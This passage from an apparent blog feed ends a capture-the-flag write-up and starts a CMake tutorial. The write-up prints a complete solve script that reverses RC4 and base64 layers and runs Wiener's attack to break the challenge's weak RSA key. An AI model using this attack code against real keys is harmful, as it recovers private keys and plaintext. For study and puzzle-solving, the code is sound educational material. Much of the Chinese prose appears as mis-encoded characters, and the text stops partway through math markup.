string\">b'EeJWrgtF+5ue9MRiq7drUAFPtrLATlBZMBW2CdWHRN73Hek7DPVIYDHtMIAfTcYiEV87W7poChqpyUXYI3+/zf5yyDOyE9ARLfa5qilXggu60lmQzFqvFv+1uOaeI2hs2wx+QZtxqGZzC0VCVWvbTQ52nA2UdUtnk8VezRMPMfmf7rOqPxDTv/aacLnI3RdLG2TbT52qtN4+naejI7Xe8HLOL765OZKdDBERKwd5ARQ3UL6YPbuOKOQahIFddnIX6rZ7dTNqCUDOjfJbMdrzJVDNjmNlkLNtYFo7M65Wfwj6PV5vvtT33FsmH50/YLEasnlCiJujYOgi2KCdf5msz1dPEvrXDDL6Csnjo+6m/44RzlluzcqMS5ZJFdrHEh68LIqtu+HCO+69Dyq4e22APq8wgN9kU6R8kikXSn/Ej0N/jOvomFCbkHskRl8xP1KgWFW0SMVDlaDCM4EKG812VgDWgSYOUnVhVpz65uOtg4Z8PrPI+BW4398dQYhD24D9EIPgvtmhNrHiEHouB46ElTGQgZBhtn6y9tL1sw=='</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    v <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    v <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">if</span> v <span class=\"token operator\">==</span> q<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'You are right!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'winer winer winnie dinner'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Do you think the encryption and decryption are the same?'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>åˆ†æé€»è¾‘çŸ¥è¾“å…¥ flag åå…ˆæ˜¯ RSA åŠ å¯†ï¼Œå† base64 åŠ å¯†ï¼Œå† RC4 åŠ å¯†ï¼Œå† base64 åŠ å¯† åˆæ¯”è¾ƒæ•°æ®å·²çŸ¥ç›´æ¥æ‰¾è„šæœ¬æˆ–å·¥å…·è§£å°±è¡Œäº†</p>\n<p>é™„ä¸Šä¸€ä¸ªåŒ…æ‹¬äº†æ‰€æœ‰è§£å¯†çš„å®Œæ•´è„šæœ¬</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64<span class=\"token punctuation\">,</span> gmpy2<span class=\"token punctuation\">,</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">continuedFra</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    cf <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">while</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        cf<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>x <span class=\"token operator\">//</span> y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">%</span> y</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> cf</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gradualFra</span><span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    numerator <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    denominator <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> cf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        numerator<span class=\"token punctuation\">,</span> denominator <span class=\"token operator\">=</span> denominator<span class=\"token punctuation\">,</span> x <span class=\"token operator\">*</span> denominator <span class=\"token operator\">+</span> numerator</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> numerator<span class=\"token punctuation\">,</span> denominator</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">solve_pq</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    par <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span> b <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a <span class=\"token operator\">*</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b <span class=\"token operator\">+</span> par<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b <span class=\"token operator\">-</span> par<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getGradualFra</span><span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    gf <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        gf<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>gradualFra<span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> gf</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">wienerAttack</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    cf <span class=\"token operator\">=</span> continuedFra<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    gf <span class=\"token operator\">=</span> getGradualFra<span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">for</span> d<span class=\"token punctuation\">,</span> k <span class=\"token keyword\">in</span> gf<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> k <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">*</span> d <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> k <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">*</span> d <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> k</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        p<span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> solve_pq<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">-</span> phi <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">if</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">==</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">return</span> d</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>pub_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">19252067118061066631831653736874168743759225404757996498452383337816071866700225650384181012362739758314516273574942119597579042209488383895276825193118297972030907899188520426741919737573230050112614350868516818112742663713344658825493377512886311960823584992531185444207705213109184076273376878524090762327</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token number\">76230002233243117494160925838103007078059987783012242668154928419914737829063294895922280964326704163760912076151634681903538211391318232043295054505369037037489356790665952040424073700340441976087746298068796807069622346676856605244662923296325332812844754859450419515772460413762564695491785275009170060931</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token string\">b'EeJWrgtF+5ue9MRiq7drUAFPtrLATlBZMBW2CdWHRN73Hek7DPVIYDHtMIAfTcYiEV87W7poChqpyUXYI3+/zf5yyDOyE9ARLfa5qilXggu60lmQzFqvFv+1uOaeI2hs2wx+QZtxqGZzC0VCVWvbTQ52nA2UdUtnk8VezRMPMfmf7rOqPxDTv/aacLnI3RdLG2TbT52qtN4+naejI7Xe8HLOL765OZKdDBERKwd5ARQ3UL6YPbuOKOQahIFddnIX6rZ7dTNqCUDOjfJbMdrzJVDNjmNlkLNtYFo7M65Wfwj6PV5vvtT33FsmH50/YLEasnlCiJujYOgi2KCdf5msz1dPEvrXDDL6Csnjo+6m/44RzlluzcqMS5ZJFdrHEh68LIqtu+HCO+69Dyq4e22APq8wgN9kU6R8kikXSn/Ej0N/jOvomFCbkHskRl8xP1KgWFW0SMVDlaDCM4EKG812VgDWgSYOUnVhVpz65uOtg4Z8PrPI+BW4398dQYhD24D9EIPgvtmhNrHiEHouB46ElTGQgZBhtn6y9tL1sw=='</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>e <span class=\"token operator\">=</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>n <span class=\"token operator\">=</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># æ¢å¤ c</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>v <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>data_xor_iv <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>x <span class=\"token operator\">=</span> y <span class=\"token operator\">=</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token string\">'911dcd09ad021d68780e3efed1aa8549'</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    sbox<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    j <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">for</span> idx <span class=\"token keyword\">in</span> v<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    y <span class=\"token operator\">=</span> y <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    k <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    c<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>idx <span class=\"token operator\">^</span> k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\"># ç»´çº³æ”»å‡»</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>d <span class=\"token operator\">=</span> wienerAttack<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/26/CMake/",
            "url": "https://3cly.github.io/2023/03/26/CMake/",
            "title": "=CMake=",
            "date_published": "2023-03-26T06:38:21.000Z",
            "content_html": "<h1 id=\"cmake-01-basic\"><a class=\"markdownIt-Anchor\" href=\"#cmake-01-basic\">#</a> cmake 01-basic</h1>\n<h2 id=\"ä»€ä¹ˆæ˜¯cmake\"><a class=\"markdownIt-Anchor\" href=\"#ä»€ä¹ˆæ˜¯cmake\">#</a> ä»€ä¹ˆæ˜¯ cmake</h2>\n<img data-src=\"\\images\\image-20230320003127778.png\" alt=\"image-20230320003127778\" style=\"zoom: 67%;\">\n<p>ä¹‹å‰åœ¨ linux è™šæ‹Ÿæœºä¸Šå®‰è£…å„ç§å·¥å…·æˆ–è€…ç¼–è¯‘æ–‡ä»¶æ—¶å€™å¸¸ç”¨åˆ° cmake, é‚£ä¹ˆä»€ä¹ˆæ˜¯ cmake å‘¢ï¼Ÿ</p>\n<p>CMake æ˜¯ä¸€ä¸ªè·¨å¹³å°çš„å®‰è£…ï¼ˆç¼–è¯‘ï¼‰å·¥å…·ï¼Œå¯ä»¥ç”¨ç®€å•çš„è¯­å¥æ¥æè¿°æ‰€æœ‰å¹³å°çš„å®‰è£… (ç¼–è¯‘è¿‡ç¨‹)ã€‚ä»–èƒ½å¤Ÿè¾“å‡ºå„ç§å„æ ·çš„ makefile æˆ–è€… project æ–‡ä»¶ï¼ŒCMake çš„ç»„æ€æ¡£å–åä¸º CMakeLists.txtã€‚ä¹Ÿå°±æ˜¯åœ¨ CMakeLists.txt è¿™ä¸ªæ–‡ä»¶ä¸­å†™ cmake ä»£ç ã€‚æ¥ä¸‹æ¥å°±ç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹ cmake çš„è¯­æ³•</p>\n<h2 id=\"ä¸€hello-cmake\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€hello-cmake\">#</a> (ä¸€) hello-cmake</h2>\n<h3 id=\"maincpp\"><a class=\"markdownIt-Anchor\" href=\"#maincpp\">#</a> main.cpp</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   std<span class=\"token operator\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Hello CMake!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token operator\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"cmakeliststxt\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#è®¾ç½® CMake æœ€å°ç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_cmake<span class=\"token punctuation\">)</span> <span class=\"token comment\">#è®¾ç½®å·¥ç¨‹å</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_cmake main.cpp<span class=\"token punctuation\">)</span> <span class=\"token comment\">#ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span></pre></td></tr></table></figure><p><strong>ç”Ÿæˆä¸å·¥ç¨‹åŒåçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åŠæ³•</strong></p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">2.6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_cmake<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_NAME</span><span class=\"token punctuation\">&#125;</span> main.cpp<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>project (hello_cmake) å‡½æ•°æ‰§è¡Œæ—¶ä¼šç”Ÿæˆä¸€ä¸ªå˜é‡ï¼Œæ˜¯ PROJECT_NAMEï¼Œ<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mrow><mi>P</mi><mi>R</mi><mi>O</mi><mi>J</mi><mi>E</mi><mi>C</mi><msub><mi>T</mi><mi>N</mi></msub><mi>A</mi><mi>M</mi><mi>E</mi></mrow><mtext>è¡¨ç¤º</mtext><mi>P</mi><mi>R</mi><mi>O</mi><mi>J</mi><mi>E</mi><mi>C</mi><msub><mi>T</mi><mi>N</mi></msub><mi>A</mi><mi>M</mi><mi>E</mi><mtext>å˜é‡çš„å€¼ä¸º</mtext><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><msub><mi>o</mi><mi>c</mi></msub><mi>m</mi><mi>a</mi><mi>k</mi><mi>e</mi><mo separator=\"true\">,</mo><mtext>æ‰€ä»¥æŠŠ</mtext></mrow><annotation encoding=\"application/x-tex\">{PROJECT_NAME}è¡¨ç¤ºPROJECT_NAMEå˜é‡çš„å€¼ä¸ºhello_cmake,æ‰€ä»¥æŠŠ</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span><span class=\"mord cjk_fallback\">è¡¨</span><span class=\"mord cjk_fallback\">ç¤º</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" 